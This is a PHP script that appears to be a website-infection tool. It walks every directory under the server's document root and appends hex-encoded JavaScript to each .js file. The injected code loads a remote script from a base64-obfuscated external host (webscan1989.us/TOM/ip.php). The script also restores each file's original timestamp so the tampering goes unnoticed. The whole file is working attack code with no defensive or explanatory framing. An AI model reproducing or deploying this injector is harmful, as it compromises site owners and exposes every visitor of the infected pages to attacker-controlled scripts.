<?php
set_time_limit(9999);  
header("Content-Type: text/html; charset=utf8");
$BY="UVEyNjAyMTU5OTQ2";
function file_add($file,$data)   //写入文件
{
	try
	{
		$a=filemtime($file); 
		$fp=fopen($file,"a+");
		fputs($fp,$data);
		fclose($fp);
		echo $file."---a+ link file_add ok\r\n<br>"; 
		try
		{
			if(touch($file,$a,$a))
			{
			echo $file."---update file time ok\r\n<br>"; 
			echo "--------\r\n<br>"; 
			}else{
			echo $file."---update file time try-error\r\n<br>"; 
			echo "--------\r\n<br>"; 
			}
		}
		catch(Exception $e)
		{ 
		}
	}
	catch(Exception $e)
	{ 
	echo $e."---update file error\r\n<br>"; 
	return 0;
	}
}

function for_file($path)   //循环遍历JS
{
	try
	{
		$d =@dir("$path");
		while (false !== ($entry = $d->read())) 
		{
			if($entry == "." || $entry == "..") continue;
			$file=$d->path."/" .$entry;
			if(@is_dir($file)) 
			{
			for_file($file);
			}
			else
			{
			if(@ereg(".js",$file)) 
			{
			echo "find files:".$file."\r\n<br>";
			$s2 = base64_decode("d2Vic2NhbjE5ODkudXMvVE9N"); //解密   webscan1989.us/TOM
			$http= base64_decode("aHR0cDovLw=="); //解密下 成http://
			$data=sprintf('document.write(\'<script type="text/javascript" src="%s%s.%s/ip.php"></script>\');',$http,sj_az_AZ(9),$s2);
			$data2=sprintf("\nvar _$=['%s'];document.write( _$[0]);",ascii_hex($data)); //ascii转换成16进制
			file_add($file,$data2);   //写入文件
			//echo hex_ascii(ascii_hex($data));  //16进制转换成ascii
			}
			}
		}
		$d->close();
		return 1;
	}
	catch(Exception $e)
	{ 
	echo $e."for web dir error\r\n<br>"; 
	return 0;
	}
}

function file_paths($url_name)   //遍历循环路径
{
	for_file($url_name); 
	try
	{
		$urlFileName = explode("/",$url_name);
		$lie=count($urlFileName);
		$fiel_url="";
		$fillarray =array();
		 for ($i=0; $i<$lie; $i++) 
		 {
			try
			{ 
			$fiel_url=$fiel_url.$urlFileName[$i]."/";
			array_unshift($fillarray,$fiel_url);
			}
			catch(Exception $e)
			{ 
		          echo "file try Exception"."<br>"; 
			}
		 }
		foreach ($fillarray as $k)
		{
		echo "============================link  link:".$k."============================"."<br>";
		for_file($k); 
		}
	}
	catch(Exception $e)
	{ 
		dirtree(".");
	}	
}
	
function sjs_random($zd0,$zd1)  //获取随机数
{
	try
	{
		return rand($zd0,$zd1);
	}
	catch(Exception $e)
	{ 
		return 4;
	}
}

function sj_az_AZ($Z1)  //随机抽取字符串
{
	$pattern='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
	for ($i=sjs_random(3,$Z1);$i<$Z1;$i++)
	{
		$key.=$pattern{mt_rand(0,35)}; //生成PHP随机数
	}
	if (!isset($key))
	{
		return "sss".sjs_random(2,$Z1)."xxx".sjs_random(2,$Z1);
	}
	return $key;
}

function ascii_hex($str)  //ascii转换成16进制
{
	return '\x'.substr(chunk_split(bin2hex($str),2,'\x'), 0,-2);
}


try
{
	$for_file=true;    //true会变为1，false则为0
	ini_set("date.timezone","Asia/Chongqing");
	@$tim2=date('Y-m-d H:i:s',time());
	echo "time:".$tim2."\r\n<br>";
	
	$url_name=$_SERVER['DOCUMENT_ROOT'];
	echo "start file:".$url_name."\r\n<br>"; 
	echo "--------------------------------------------------\r\n<br>";
	
	if ($for_file)
	{
		echo "====WEB====\r\n<br>"; 
		for_file($url_name);   //循环遍历JS
	}else{  //false
		echo "====file_paths WEB====\r\n<br>"; 
		file_paths($url_name);   //遍历循环路径
	}
}
catch(Exception $e)
{ 
dirtree(".");
} 

?>

